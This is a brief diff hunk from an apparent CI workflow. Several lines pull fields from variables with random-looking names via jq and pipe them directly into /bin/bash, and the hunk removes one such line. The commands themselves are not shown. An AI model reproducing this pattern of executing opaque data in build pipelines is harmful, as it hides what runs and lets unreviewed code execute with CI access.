@@ -49,7 +49,6 @@ jobs:
           echo $d7 | jq -r .in7801 | /bin/bash
           echo $puvb1 | jq -r .j90 | /bin/bash
           echo $q39021 | jq -r .bicd63156 | /bin/bash
-          printf '%s' "$x6" | jq -r .afxxk4036 | /bin/bash
           printf '%s' "$sp0140" | jq -r .uji69935 | /bin/bash
           echo $nxjds0 | jq -r .eiecu3 | /bin/bash
 
